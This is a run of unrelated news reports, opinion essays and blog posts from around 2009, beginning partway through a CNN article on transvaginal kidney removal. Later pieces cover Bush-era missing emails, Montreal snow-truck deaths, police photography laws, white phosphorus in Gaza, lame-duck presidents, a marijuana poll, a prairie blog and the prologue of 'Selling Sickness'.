" If you asked our patient , she said it was like getting a tooth removed .
She was walking that night and left the next day , " Montgomery said .
The procedure is done by inserting " wand - like cameras and tools " through small incisions in the abdomen and navel .
Doctors then insert a hollow tube through the vagina with a bag at the end .
Once the kidney is cut loose , surgeons use video from the cameras to guide them as they maneuver the bag around the organ , place it in the tube and pull it out through the vaginal opening , Montgomery said .
A kidney weighs approximately one pound and is roughly the size of a clenched hand .
In an effort to ensure a more sterile procedure , the vagina is treated with Betadine , a sterilizing solvent commonly applied during surgery .
But some physicians wonder how clean the procedure can actually be .
" It 's good to take such [ sterilization ] measures , " said Dr. Jihad Kaouk , director of laparoscopic and robotic surgery at the Cleveland Clinic .
" But the tube touched the vagina .
And the bag touched the tube .
And the bag touched the kidney "
He added , " delivering a kidney from the vagina , which is not sterile -- is it a potential risk or a real risk ?
We 'll find out now . "
Kaouk also expressed concern over the quality of the kidney once it has been squeezed into a tube .
" The concept of minimizing incisions and decreasing pain after surgery is always a good idea , but we should always check at what price , " he said .
CNN 's Elizabeth Cohen and Jennifer Pifer - Bixler contributed to this report .

Encyclopedia Bush and the Case of the Missing Emails
In six days , the Bush Administration will take its leave of the White House .
But before departing , it must surrender any device or media that might contain those infamous five million missing email messages from between March 2003 and October 2005 – messages that covered a period including the U.S. invasion of Iraq and the federal response to Hurricane Katrina .
In a blistering emergency court order , U.S. Magistrate Judge John Facciola–who has clearly lost all patience with the current administration –directed the Executive Office of the President to preserve every workstation and mobile device , every hard drive , memory stick , CD and DVD “ that may contain emails sent or received ” between March 2003 and October 2005 – irrespective of the intent with which it was created .
In Facciola ’s eyes , not only has the administration failed in its obligation to safeguard all electronic messages , it has willfully ignored a court ’s instructions to search a full range of locations for all electronic messages that may be missing .
“ The records at issue are not paper records that can be stored , but electronically stored information that can be deleted with a keystroke , ” Facciola wrote .
“ Additionally , I have no way of knowing what happens to computers and to hard drives in them when one administration replaces another . ”
“ I have always begun with the premise that …the e-mails that are said to be missing are the very heart of this lawsuit and there is a profound societal interest in their preservation , ” Facciola continued .
“ They are , after all , the most fundamental and useful contemporary records of the recent history of the President ’s office .
If Napoleon was right when he said that he did not care who wrote France ’s laws if he could write its history , then the importance of preserving the e-mails cannot be exaggerated . ”
Indeed .
Groups seeking to preserve the emails at issue here applauded the court order .
“ There is nothing like a deadline to clarify the issues , ” said National Security Archive Director Tom Blanton .
“ In six days the Bush Executive Office of the President will be gone and without this order , their records may disappear with them .
The White House will complain about the last - minute challenge , but this is a records crisis of the White House ’s own making . ”

MONTREAL–Passersby watched in horror yesterday morning as an elderly couple was struck down in the city 's core by a giant snow - removal truck .
Then , just as police were describing the accident as tragic , it happened again in the afternoon .
Another senior citizen , another big truck , another death .
The freakish coincidence , police spokesperson Olivier Lapointe said , was an " exceptional situation . "
Montreal 's snow woes just keep getting worse .
The city was being roundly blasted for its seemingly ineffective snow removal ; now , three people are dead as a result of its efforts .
In the first mishap , the 72 - year - old man was killed instantly .
Ambulance service spokesperson Bart Panarello said the woman , 71 , " was also crushed under the wheels , so we had to have the fire department help us move the truck . "
Once freed , she was rushed across the street to Nôtre - Dame hospital to no avail .
In the afternoon , the same type of truck – with a long box in back to hold snow augured from the street – hit a 76 - year - old woman in the northern borough of Ahuntsic on a narrow street .
She died on the spot with massive head injuries .
Both trucks – run by subcontractors – were turning at the time .
Police were still investigating , but Lapointe said it appears as as if the pedestrians had the right - of - way .
The truck drivers were taken to hospital suffering from shock , he added .
Charges against them have not yet been determined .
Mayor Gérald Tremblay urged Montrealers to be vigilant .
" This is a true tragedy , " Tremblay said .
" It 's not one person , it 's three people . "
Before yesterday , there had been just three snow - clearing related deaths in the last four years .
The mayor said city hall sends safety guidelines to all 19 arrondissements – or boroughs – doing snow removal .

The winter 's above - average snowfall had already created tensions .
When the city 's snow czar , the mayor 's brother Marcel Tremblay , suggested people should simply wear crampons on their shoes , he was dumped from the position .
During a recent big storm , many plow operators in nine boroughs stopped working to protest not being paid overtime .

Cops moving away from role of public servants , assuming God - like status
Paul Joseph Watson

Wednesday , January 28 , 2009
New laws set to be passed in England and Canada would make it illegal to use bad language or take photographs of police officers , moving us further away from the idea of police as public servants and more towards the notion of cops assuming God - like status .
According to the British Journal of Photography , the Counter - Terrorism Act 2008 , which is set to become law on February 16 , “ allows for the arrest and imprisonment of anyone who takes pictures of officers ‘ likely to be useful to a person committing or preparing an act of terrorism ’. ”
The punishment for this offense is imprisonment for up to ten years and a fine .
However , even before the passage of the legislation , police in Britain have already been harassing and arresting fully accredited press photographers merely for taking pictures of them at rallies and protests .
Besides the 4.2 million CCTV cameras in Britain , one for every fourteen people , Police are now equipped with mobile surveillance vans and head mounted cameras and they routinely videotape everyone at a protest , yet anyone attempting to record them has been met with increasing hostility .
( ARTICLE CONTINUES BELOW )
A d v e r t i s e m e n t
Justin Tallis , a London - based photographer , was taking pictures of the anti-BBC protest this past weekend when he was approached by an officer .
The officer demanded to see his photographs and when Talis refused the officer tried to seize his camera , arguing that Tallis ‘ should n’t have taken that photo , you were intimidating me ’ .
“ The incident lasted just 10 seconds , but you do n’t expect a police officer to try to pull your camera from your neck , ” Tallis told BJP .
“ The police are arresting journalists , seizing their equipment , treating them as suspects , looking at their photographs , taking copies , perhaps returning them to them , taking no further action often ( but not always ) and they ’ve got , straight away , what they want , ” solicitor Mike Schwartz of Bindman and Partners told a UK National Union of Journalists conference .
“ At every demonstration , the police are figuratively scratching their heads as to how they can get hold of your material .
That ’s what they ’re after . ”
“ The police take action , they often get what they want , and allow the lawyers in court to mop up what ’s happened afterwards .
That ’s one of the trends and areas where there is a real problem : the police arresting journalists and seizing their material in order to use it in prosecutions . ”
An incident captured on camera and uploaded to You Tube proves that some police officers in Britain already think that is is against the law to film them .
Film - maker Darren Pollard was clearing up flood debris from his front garden when he noticed the police harassing a youth opposite his house .
Darren retrieved his camera and began filming the officers .
After noticing Pollard , the officers approached and then tried to claim that it was illegal to film them .
After being informed by their superior that it was not illegal to film police , the officers left the scene .
Watch the clip below .
Meanwhile , in Montreal Canada , Montreal police are asking the city to outlaw bad or insulting language used against police officers , making it illegal for members of the public to call cops profanity - laced nicknames , or lob jeers , such as “ pig ” and “ doughnut - eater . ”
“ Chablo said several municipalities across Quebec – including Quebec City – have some variation of a law that prohibits citizens from spewing slurs at police officers , ” reports the Canadian Press .
“ There are an awful lot of words that are borderline and it ’s highly subjective – it ’s too vague , ” said Ronald Sklar , a McGill University law professor , said of the police union ’s proposal .
What ’s next ?
How long before we have to officially salute or even get down and lick some boots ?
The vast majority of people respect police officers and the dangerous work they undertake , but when people committing no crimes are being harassed and having their rights taken away while police are being given more rights to crack down on the public , the balance is tipping dangerously away from cops being public servants funded by the taxpayer and more towards them assuming a superior role in society , ruling over the scum with an iron fist .

Comment on this article
When Nafiz Abu Shabam received a 5 - year - old patient at the Shifa Hospital early in the war between Israel and Hamas , he dressed her burns and sent her for tests .
Three hours later , when he and other medical staff redressed the wound , they saw smoke coming from it .
" We found small pieces of foreign material in her body , and even when we picked it out , the wound was still smoking , " he says .
" We were later told [ by foreign doctors and human rights workers who arrived after the war started ] that it was white phosphorus . "
Dr. Abu Shabam , head of the burn unit of Gaza City 's main public hospital , now says that hundreds of Gazans from all parts of the strip , who were brought to the hospital during the war with unusual burns , must have been victims of white phosphorus shells used by Israel .
" We had patients who had burns over 10 to 15 percent of their body , and with that much of a burn , these people should not have died , " Abu Shabam says .
His accusations about white phosphorus munitions add to the growing pool of accounts from Palestinian and foreign physicians and rights groups that suggest Israel used white phosphorus munitions in populated areas during the war and against the international norms of war .
As white phosphorus is highly incendiary , can reignite when exposed to oxygen , and causes painful chemical burns , it is not intended – or legal under international law – for use in civilian areas .
' Weapons permitted by law '
Israel initially denied that white phosphorus munitions were used in its 22 - day war with Hamas .
It now says , " there was no illegal use of phosphorus or any other material , " according to the spokesman for Israel 's Ministry of Foreign Affairs .
Amid the allegations that white phosphorus shells were used in populated areas , Israel announced an investigation .
" In response to the claims of NGOs and claims in the foreign press relating to the use of phosphorus weapons , and in order to remove any ambiguity , an investigative team has been established in the Southern Command to look into the issue , " said an Israel Defense Forces ( IDF ) spokesman .
" It must be noted that international law does not prohibit the use of weaponry containing phosphorus to create smoke screens and for marking purposes .
The IDF only uses weapons permitted by law . "
An Israeli foreign ministry statement pointed to findings by the International Committee of the Red Cross ( ICRC ) , which said in mid-January that it found no evidence of illegal phosphorus use .
" The investigation of this matter , " the spokesman said , was part of " routine IDF checks of its internal operating procedures and in no way indicated any illegal use . "
The ICRC has since clarified its position .
" The fact that International Humanitarian Law does not specifically prohibit phosphorous weapons does not imply that any specific use of weapons containing this substance is legal , " said Peter Herby , head of the ICRC's Arms Unit .
" The legality of each incident of use has to be considered in light of all of the fundamental rules I have mentioned .
It may be legal or not , depending on a variety of factors . "
Mr. Herby also said : " The use of such white phosphorous weapons against any military objective within concentrations of civilians is prohibited unless the military objective is clearly separated from the civilians .
The use of air - dropped incendiary weapons against military objectives within a concentration of civilians is simply prohibited .
These prohibitions are contained in Protocol III of the Convention on Certain Conventional Weapons . "
' Most compelling case '
In Shifa Hospital 's burn unit , Yasser Khalil checks on one of their most seriously injured patients – a woman with abnormal burns on her arms and legs .
Dr. Khalil says he believes the burns were caused by white phosphorus .
" It 's the first time we 've seen anything like this , " he says .
" It 's completely different from the usual burns we see every day .
It 's very deep , and if you smell it , you have a hard time breathing .
It goes beyond a fourth - degree burn .
It can burn through the muscle and can reach the bone . "
His description matches one about white phosphorous found on the globalsecurity .org website :
" The particles continue to burn unless deprived of atmospheric oxygen .
Contact with these particles can cause local burns .
These weapons are particularly nasty because white phosphorus continues to burn until it disappears .
If service members are hit by pieces of white phosphorus , it could burn right down to the bone . "
The woman 's name is Sabah Abu Halima .
She lays on a bed here , wrapped in bandages , mourning the loss of her husband and four of her children .
They died in an Israeli shelling attack in El - Atatra , near Beit Lahiya in the northern Gaza Strip , an area with a mix of villages and agricultural fields .
Israel says that the area around their house was being used by Hamas militants .
Two others in the house , a granddaughter and daughter - in - law , were also badly burned and transferred to Egypt for treatment .
The Jan. 5 attack provides what Marc Garlasco , senior military analyst for Human Rights Watch ( HRW ) , calls " the single most compelling case " of white phosphorus use by the Israeli army .
The Abu Halima family are farmers , growers of crops such as strawberries and cucumbers .
They were eating a late lunch in the family room when Mrs. Abu Halima , mother of 10 , got up to go to the kitchen to get more food .
She hardly heard the shell , but she felt it .
" The explosion was not that strong , but suddenly you 're in the middle of fire , just fire and smoke , " she says .
" I heard the little one crying ' Mama , Mama , ' but I could n't see anything or do anything because of the smoke and fire , " she explains , and then begins to weep .
Above her bed hangs a TV , broadcasting a buzz of somber verses from the Koran .
' We have the evidence '
Abu Shabam , head of the burn unit , complains that enough is n't being done by the international aid and rights groups to verify whether white phosphorus munitions were used in civilian areas .
" The time is now , " he says .
" We need them to be investigating and testing the area of explosions before evidence is lost . "
John Ging , the head of United Nations Relief and Works Agency ( UNRWA ) , the main aid agency to the Palestinians , says it 's clear that the shells that hit the UN compound here on Jan. 15 contained white phosphorous .
When he was interviewed nine days later , in front of the warehouses in which food for distribution to Palestinians was destroyed , some of it was still smoking .
Mr. Ging says this is symptomatic of white phosphorus .
" We have the evidence , " he says .
" We have the shell casings and we have the materials to stand by our allegations that it is white phosphorus . "
New York - based HRW is expected to issue a report on the issue in the coming weeks .
" When we got into Gaza , we found about 72 white phosphorus shells marked M825E1 , which is the US designation for a white phosphorus shell which has been upgraded , " says Mr. Garlasco .
He says he found spent and unexploded white phosphorus canisters .
Of the 72 , 24 were found in or adjacent to homes .
Inside the Abu Halima home in particular , he says , he found the shell and a white phosphorus canister , and another two canisters outside the house .
He says the burned - out walls also left behind the residue of white phosphorus .
" On top of all that , we found hundreds of pieces of felt wedges that are impregnated with phosphorus , and when they were disturbed , they would reignite , " he says .
" You kick it and it's on fire again . "
Amnesty International says a fact - finding team here has also found evidence that white phosphorus was used in populated areas .
" We now know that white phosphorus munitions were used in built - up civilian areas , although the Israeli authorities previously denied this , " said Donatella Rovera , head of Amnesty International 's investigation team in Gaza , in a statement on the organization 's website .
Christine Gosden , a British medical expert who researched the effects of chemical and biological weapons in Saddam Hussein 's Iraq , says that the international community , preferably a UN Security Council member , needs to demand an investigation .
" We have an appalling death toll , and we have to see that every option be used to find out what killed them .
There might be better ways of treating the people who are injured and to do that , we need to know what was used , " says Professor Gosden , of Britain 's Royal Liverpool University Hospital .
" You need a responsible laboratory with no ax to grind to be testing this . "
Hope is strong early in every new President ’s first term .
It is a time of great expectations .
This is the triumph of hope over experience .
Before the hoped - for day of deliverance on January 20 at high noon , there is a two - month transition period .
The dark night of the incumbent Administration is expected to recede in the brightness of a new dawn .
This calls forth exuberant editorials by members of the victors ’ party .
Consider this forecast by Thomas Kostigan , who writes the “ Ethics Monitor ” on Market Watch .
We know that we must protect our planet to protect ourselves and our future .
We know that politicians will blatantly lie and need more accountability .
We know that we have a strong say in how our country is run and that , yes , we can vote for change .
We know that despite tough times we can come together and celebrate gold medals .
We know that we can experience happiness , that no matter how ugly and uncomfortable and downright bad it gets , that we can rise .
We will .
And that is why it is the best of times , because the worst of times is behind us .
There is hope .
In just a few weeks the emblem of that hope , President - elect Barack Obama , will take office .
He said : “ Our destiny is inextricably linked … together our dreams can be one .
‘ We cannot walk alone , ’ the preacher cried .
‘ And as we walk , we must make the pledge that we shall always march ahead .
We can not turn back . ’
America , we cannot turn back … not with so much work to be done ; not with so many children to educate , and so many veterans to care for ; not with an economy to fix , and cities to rebuild , and farms to save ; not with so many families to protect and so many lives to mend .
America , we can not turn back .
We can not walk alone .
At this moment … we must pledge once more to march into the future .
Let us keep that promise , that American promise , and in the words of scripture hold firmly , without wavering , to the hope that we confess . ”
Amen .
To hope .
To a happy new year .
It can be one .
It will be one .
The tide has turned .
Hope heralded can turn true .
I would like to think that this is satire .
I am not so sure .
But even if it is , its general assessment is not being challenged by the world of liberal punditry .
The dawning of this new day will be money in the bank for Rush Limbaugh and Ann Coulter .
Let us hope , for their sake at least , that the FDIC will do its job over the next four years .
Before that dawn arrives , we can all enjoy a departing lame duck .
Just as the chickens are coming home to roost , the lame duck waddles off .
This comparatively rare event is one of the finest traditions of American political history .
We should savor every moment .
I call it “ reality on parade . ”
A PARADE OF LAME DUCKS
George W. Bush is the most memorable lame duck President in 75 years .
The last lame duck President as lame as Bush was Herbert Hoover .
What is a lame duck President ?
The general definition is this : “ A President whose term has ended because he was not re-elected , but who has not yet been replaced by the newly elected President . ”
His period of lameness lasts from election day to inauguration day .
I think this definition is inadequate .
I define a lame duck President as follows :
A President who remains in office after a Presidential election , whose term will end on January 20 , and who will be replaced by a President of the rival party .
By this standard , Ronald Reagan was not a lame duck President .
He was replaced by George H. W. Bush , whose senior agent was ( and probably still is ) James Baker III , who had been Reagan ’s Chief of Staff in his first term .
Baker also served as Chief of Staff in Bush ’s final year .
In between , he served as Reagan ’s Secretary of the Treasury and as Bush ’s Secretary of State .
The transition from Reagan to Bush was almost seamless .
There was no change in any major policy .
It was business as usual .
Some historians might make the argument that Harry Truman was as lame a duck as Hoover .
His popularity rating was low .
A Republican President would soon preside over a Congress with Republicans in control of both houses .
This had not happened in 20 years , and would happen again only under the present Bush .
Eisenhower was much beloved and trusted .
I argue that Truman was in better shape than Hoover .
Truman ’s domestic policies would not be reversed , nor did the voters think they would be .
Eisenhower had not campaigned on radical change here .
This expectation of continuity was fulfilled .
The top marginal tax rate remained at 91 % .
Kennedy lowered it to 70 % , not Eisenhower .
The Korean war was in a stalemate in early 1953 .
Technically , it still is .
Congress had never declared war , and the 1953 truce to this legally non-war was not a peace treaty .
It remains a cease - fire .
There would be no victory .
Voters were willing to accept this outcome in late 1952 .
They just wanted it to end .
Eisenhower had promised : “ I will go to Korea . ”
It looked as though he would end it .
They voted for him .
Truman had not run , and Stevenson was no hawk .
Truman had been in a holding pattern before the election .
Yet even the Hoover - Roosevelt transition period was mostly illusion .
As Murray Rothbard proved in his 1963 book , America ’s Great Depression , Hoover ’s policies were taken over by Roosevelt .
There was no fundamental change .
There was a change in rhetoric .
There were lots of new programs , but the big ones were extensions of Hoover ’s policies .
Even Roosevelt ’s closing of the banks in March of 1933 had been proposed by Hoover , who complained years later that the idea had been his , but Roosevelt had refused to support it .
So , Hoover did nothing .
Hoover and Roosevelt had known each other for years .
In their years off the Federal payroll or the New York State payrolls in the 1920 ’s , they both had been on the payrolls of business organizations with headquarters at the little - known but crucial address : 120 Broadway , New York City .
These connections were discussed by Antony Sutton in his 1976 book , Wall Street and FDR .
Historians , who are universally pro-FDR and anti-Hoover , have ignored all these connections for 75 years .
They discreetly refuse to talk about Roosevelt ’s employment as a bond salesman , 1921 — 1929 .
A new President can and does accelerate the centralizing tendencies of his predecessor , but he cannot reverse them .
The process of centralization continues .
Roosevelt accelerated Hoover ’s centralization .
He got credit for this in the textbooks because historians favor national centralization .
They also like his anti-plutocrat rhetoric .
This does not change the fact that he was a lifelong plutocrat .
It is true that Hoover could not get new laws passed in the final days of his Administration .
He faced a Democrat - controlled Congress .
But he had faced this in the House ever since 1931 , with only a one - vote majority in the Senate , not counting a Farm - Labor Party Senator .
Bush has faced the same thing .
He could not get the auto industry bailout passed after the election , but he just siphoned off money from the bank bailout fund .
Nothing fundamental has changed .
We have had only one lame duck President who made a big difference : John Adams .
Adams in his final days appointed John Marshall to the Supreme Court .
Marshall shaped American law for the next two decades .
He was a centralizer and a Federalist — the last of the Federalists .
Adams had seemed to be impotent .
He was n’t .
He left Washington on the morning of Jefferson ’s inauguration .
James Buchanan is accurately regarded as the archetype of a lame duck President .
He refused to go to war when seven states seceded after the election of 1860 .
He let Lincoln deal with that issue .
He just sat .
For this , he has been regarded by historians as the worst President in American history .
Only Warren G. Harding has given him a run for the money .
Harding also sat .
I believe George W. Bush will replace Buchanan for the next few decades .
I have given my reasons here .
It was not that Bush sat .
He was the most activist President since Lyndon Johnson .
He got us into two small wars and ran huge Federal deficits .
Johnson got us into one large war and let Nixon run the deficits .
But Bush had no notable successes from a liberal historian ’s point of view , despite his budget - busting Medicare prescription drug bill .
Johnson passed the Great Society ’s budget - busting bills , and then teamed up with Teddy Kennedy in 1965 to lower the immigration barriers that had prevailed ever since 1924 .
So , Johnson ’s Presidency is assessed as tarnished , because of Vietnam , whereas Bush ’s Presidency will be assessed as the greatest failure in American history .
Bush is a lame duck .
Realistically speaking , he has been in a holding pattern since November .
This is nothing new .
After his attempt to reform Social Security died in 2005 , which everyone knew it would , he became a caretaker President .
The bureaucracy chugs along , issuing 70,000 three - column pages of small print in the Federal Register each year , year in and year out , as it always does .
PASSING THE TORCH
Bush has been gracious in passing the symbolic torch to Obama .
This is another way of saying that CFR Team B is letting its man hold press conferences about preparing to take the torch , and CFR Team A is being gracious , just as it was in early 1993 .
Clinton was not so gracious in 2001 , but he and his wife were busy in 2001 packing up White House artifacts and their files .
Like Clinton in 2001 , Bush spends his days pardoning criminals , which is a major activity of lame duck Presidents .
Obama is assembling his advisors , most of whom are retreads from the Clinton years .
He is even retaining Bush ’s Secretary of Defense , where change supposedly was coming and is long overdue .
Gates was the head of the CIA .
Bush ’s father was the head of the CIA .
The more things change , the more things stay the same .
The only thing that changes much is the national debt .
The rate of increase is accelerating .
This is Bush ’s legacy .
Obama will honor it .
THE STIMULUS
We are in a recession .
There is widespread hope today that we will not be in recession for long .
Investors and politicians have enormous faith in Keynesianism .
They believe that a fiscal deficit will be a stimulus .
They cheer new spending programs .
They love to hear about public works projects .
They want to see concrete and steel and bulldozers .
They do not ask : “ What else could have been done with all this money ? ”
They do not search for the thing unseen , a fact noted by Frédéric Bastiat in the 1840 ’s and Henry Hazlitt a century later .
The financial press is excited over the proposed stimulus package .
How large will it be ?
Obama is not saying .
The trillion - dollar figure is tossed around , but it is not clear if this is a one - year or two - year deficit .
Let me make my position clear .
If the stimulus comes as a result of a tax cut , I am in favor of it .
Paraphrasing Will Rogers , I never met a tax cut I did n’t like .
Will it be $ 300 billion ?
I hope so .
Will it be $ 500 billion ?
Even better .
Wo n’t this increase the deficit ?
Of course .
Is n’t decreasing the Federal deficit job number one ?
Not at all .
Decreasing Federal spending is job number one .
I do not mean decreasing the rate of growth .
I mean an actual decline in 2009 ’s spending from 2008 .
This is the ultimate fantasy in American politics .
Why is it better to cut taxes than cut the deficit ?
Because paying taxes is compulsory .
Investing in Treasury debt is not .
I can opt out of the effects of the deficit if I invest wisely .
I can not opt out of taxes .
Better a bird in hand — a tax cut now — than two under the bush : a balanced budget Real Soon Now .
Congress will spend any surplus and then borrow more .
That is what I wrote in the late 1990 ’s , when the phony Clinton surplus — siphoning off Social Security and Medicare — was heralded as the wave of the future .
My view is that it is better to take a tax cut now than to forego a tax cut on the assumption that increasing revenues will someday equal spending .
They wo n’t .
A spending cut would reflect a political transformation on an unprecedented level .
I would be accurate to call such a reduction as a political revolution .
Short of national bankruptcy after hyper- inflation , this is not going to happen .
So , we should take what we can get : a tax cut .
Will a decrease in taxation be healthy for the economy ?
Yes .
Will it be accompanied by increased Federal spending ?
Yes .
Will this be productive for the economy ?
No .
So , the question decision - makers and investors had better ask themselves is this : “ Will the tax cuts benefit my capital or my income more than the spending increases hurt the general economy , thereby hurting me ? ”
Each company or each portfolio will have a different answer .
It is easier to change your portfolio than to change your company , assuming you do n’t quit and try to get a better job , which is always risky , but especially in a recession .
Over the next year , we are going to see a lot of red ink .
The press will focus on the wonders of borrowed money .
It will not pay nearly so much attention to Federal Reserve policy since September 1 .
There will be a stimulus , but it will be in the form of fiat money .
The tax cut will help .
It will not get the economy out of the recession without a continuing stream of fiat money .
I think we will get that stream .
CONCLUSION
A lame duck President does nothing politically .
This is the most productive thing that a President can do most of the time .
The lame duck period is a great blessing .
The President does not propose new programs .
If he did , he could not get them passed .
Enjoy the period of high hopes while it lasts .
When it fades , due to the magnitude of the recession internationally , reality will intrude .
Then we will see what the Clinton retreads can do to bring back the phony surpluses of Bubba ’s tenure in office .
I hope they cut taxes even more .
As long as the Federal government is going bankrupt anyway , we might as well get a rebate .

A new CBS / NYT poll finds that 41 % of Americans agree that marijuana use should be legalized .
While legalization still fails to garner majority support , it ’s clear that we ’re headed in the right direction .
Notice that only 27 % supported legalization in 1979 :
LEGALIZING MARIJUANA
Like 30 years ago , a majority of Americans do not think the use of marijuana should be made legal , but the percentage that thinks it should be has grown .
Now , 41 % of Americans support legalizing marijuana use , compared to just 27 % who felt that way in 1979 .
SHOULD MARIJUANA USE BE LEGALIZED ?
CBS / NYT CBS /NYT
Now /1979
Yes 41 % 27 %
No 52 % 69 %
There is a huge generation gap on this issue .
More adults under 45 ( 49 % ) approve of legalizing marijuana use than oppose ( 45 % ) , while just 31 % of adults over age 45 approve of it ; six in 10 are opposed .
The generation gap is particularly encouraging , confirming a popular theory among reformers that if we simply wait not - so - patiently , we ’ll eventually win when our opposition literally drops dead .
These numbers reveal that we ’re well within striking distance of achieving majority support for legalization .
Moreover , we ’re comfortably within the range in which meaningful reform to our marijuana laws will produce significant and vocal approval from the public .
If there was ever a time when our political climate was fatally non-receptive to this idea , we have moved beyond that .
Keep in mind that the 41 % result was arrived at without any particular political context .
That ’s just the number of people who generally walk around believing that marijuana should be legal .
It ’s possible to build that number significantly when the question is framed around an actual policy proposal , such as in Massachusetts where 65 % of voters supported decriminalization .
Because our arguments are strong , we benefit from the debate .
Legalization initiatives were unsuccessful in Nevada and Colorado in 2004 , but I ’d like to think that in the current change - focused political climate , it ’s quite possible that similar measures would be victorious .
For one thing , the departure of drug czar John Walters means we ’re unlikely to face the same vicious opposition we ’ve become accustomed to , as I simply do not envision Obama ’s White House undertaking a regional propaganda scare - tour the next time we try something big .
The fact is that we ’re moving in exactly the right direction , though not nearly as fast as any of us would prefer .
We must be patient , so long as our patience does n’t take the form of inaction .
We ’re entering a period of remarkable political opportunity for our cause .

We gotta get out of this place ,

Do n’t Mess With The Prairie Folk
If there ’s one thing I ’ve learnt in recent days it ’s that you should never mess with the prairie folk , not unless you 're willing to face the dreaded Saskatuan sarcasm mechanism .
Here ’s how it all went down :
This past week , after the main Neil Young fan site , Neil Young News / Thrasher ’s
Wheat , put up an excerpt from an old piece of mine called Talkin ' Prairie Triangle of Inspiration ( A.K.A. Bob Dylan , Neil Young and Joni Mitchell Make Their Great Escape ) a backlash of sorts occurred , one initiated and led by a few of those afore - mentioned good folk out on the prairie ... and all of a sudden I found myself facing a barrage of bitter , angry , sarcasm .
Yes , words of indignation were unceremoniously being spewed in my general direction .
And I literally unleashed a monster .
You see , the central premise of this Talkin ' Prairie Triangle piece , for those of you who have n't yet read it , is that after growing up within this barren cultural wasteland out on the prairie ( that is , the Saskatoon - Winnipeg - Hibbing Triangle - though I ’ve now been informed that Hibbing is not , in fact , on the prairie at all ) , Neil , Bob and Joni all got the hell out as soon as they possibly could .
Cultural Wasteland ?
Now I do see how calling the prairies a " cultural wasteland " may have offended some , but I do n’t see how anyone could disagree with my apt description of the region as “ the middle of nowhere ” .
Even
Thrasher himself , the guy who runs the Neil site , says he had no idea it would cause such an angry response .
Of course the piece is supposed to be a bit tongue in cheek and at least somewhat humorous .
I mean , it certainly was n’t written as some sort of scathing attack on the good people of the prairies .
No , it was clearly just meant to be a piece praising Bob , Neil and Joni for having the good sense to get the hell out of there ( “ there he goes again ! ” ) .
Either way , I do n’t think my intentions matter much to the incensed prairie folk .
Nor to that Saskatuan creature either , for that matter .
It would seem I ’ve burned all of my bridges with all of them .
It would seem that I ’ve simply gone too far in assuming that these three great musicians all made the right choice in leaving and heading off to Toronto and / or New York and , eventually , California .
Sadly , it would seem that I 'm no longer welcome on the prairie .
Memories of Prairie Life
I should mention that I spent a summer in Saskatchewan , back in 1979 , living and working on an enormous farm owned by a friend of my dad's , and I had an amazing time there .
I was only 12 and I got to drive a car and shoot lots of rats at the dump ( not something I 'm proud of or that I 'd want to do today , but it was sure one hell of a good time when I was 12 years old ) .
I remember lots of friendly people there , great chocolate milkshakes at the cafes , listening to a lot of Supertramp and The Cars , and a crazy , intense love for the local Roughriders football team .
It was a truly great summer .
I should also mention that I ’ve driven across the country numerous times and the prairies , though a bit monotonous , have always struck me as beautiful and , uh , vast .
Of course with eight months of the year spent inside trying to survive the minus - 40 degree winter months , it 's also a perfect place to work on your guitar , singing and song - writing skills , which is part of what explains this overabundance of musical talent that emerged from such a relatively tiny population .
Furthermore , I should also point out that Tommy Douglas - one of my political heroes and one of the greatest Canadians of all time - helped radically transform Canada for the better from right there in Saskatchewan .
And , finally , I should say that in my full piece - though not part of the excerpt that appeared on the Neil Young News / Thrasher ‘s
Wheat site - I did mention that my own dear mom is from Winnipeg .
However , I have to admit I did also talk about how she , too , escaped at the earliest possible opportunity .
Rage Against The Combine
So , come on prairie folk , ease up on the anger already .
Ok , " cultural wasteland " may have been a bit extreme and harsh , but just accept it : Bob , Neil and Joni were n’t going anywhere unless they got the hell out of there .
And that ’s not an insult , that ’s just reality .
And , hey , the prairies may not be the center of civilization , but at least you 've got those great Saskatoon berries that everyone loves .
And Gordie Howe too .
And , as I just learned , that infamous Saskatuan beast as well .
And do n't forget that you gave the world Bob , Neil and Joni .
So , be proud !
And let that anger go .

Prologue
Selling sickness
by Ray Moynihan and Alan Cassels
Thirty years ago the head of one of the world ’s best - known drug companies made some very candid comments .
Close to retirement at the time , Merck ’s aggressive chief executive Henry Gadsden told Fortune magazine of his distress that the company ’s potential markets had been limited to sick people .
Suggesting he ’d rather Merck to be more like chewing gum maker Wrigley ’s , Gadsen said it had long been his dream to make drugs for healthy people .
Because then , Merck would be able to “ sell to everyone . ”
1
Three decades on , the late Henry Gadsden ’s dream has come true .
The marketing strategies of the world ’s biggest drug companies now aggressively target the healthy and the well .
The ups and downs of daily life have become mental disorders , common complaints are transformed into frightening conditions , and more and more ordinary people are turned into patients .
With promotional campaigns that exploit our deepest fears of death , decay , and disease , the $ 500 billion pharmaceutical industry is literally changing what it means to be human .
Rightly rewarded for saving life and reducing suffering , the global drug giants are no longer content selling medicines only to the ill .
Because as Wall Street knows well , there ’s a lot of money to be made telling healthy people they ’re sick .
At a time when many of us are leading longer , healthier , and more vital lives than our ancestors , saturation advertising and slick “ awareness - raising ” campaigns are turning the worried well into the worried sick .
2
Mild problems are painted as serious disease , so shyness becomes a sign of social anxiety disorder and premenstrual tension a mental illness called premenstrual dysphoric disorder .
Everyday sexual difficulties are seen as sexual dysfunctions , the natural change of life is a disease of hormone deficiency called menopause , and distracted office workers now have adult ADD .
Just being “ at risk ” of an illness has become a “ disease ” in its own right , so healthy middle - aged women now have a silent bone disease called osteoporosis , and fit middle - aged men a lifelong condition called high cholesterol .
With many health problems , there are people at the severe end of the spectrum suffering genuine illness , or at very high risk of it , who may benefit greatly from a medical label and a powerful medication .
Yet for the relatively healthy people who are spread across the rest of the spectrum , a label and a drug may bring great inconvenience , enormous costs , and the very real danger of sometimes deadly side effects .
This vast terrain has become the new global marketplace of potential patients – tens of millions of people – a key target of the drug industry ’s multibillion - dollar promotional budgets .
The epicenter of this selling is of course the United States , home to many of the world ’s largest pharmaceutical companies , and the stage on which most of the action in this book takes place .
With less than 5 percent of the world ’s population , the U.S. already makes up almost 50 percent of the global market in prescription drugs .
3
Yet spending in the U.S. continues to rise more rapidly than anywhere else , increasing by almost 100 percent in just six years – not only because of steep increases in the price of drugs , but because doctors are simply prescribing more and more of them .
4
Prescriptions for the most promoted categories , like heart medicines or antidepressants , have soared astronomically in the U.S. , with the amount spent on these drugs doubling in less than five years .
5
In many other nations the trend is also up .
Young Australians took ten times more antidepressants in 2000 than they did in 1990 .
6 Canadian consumption of the new cholesterol - lowering drugs jumped by a staggering 300 percent over a similar time period .
7
Many of those prescriptions enhanced or extended life .
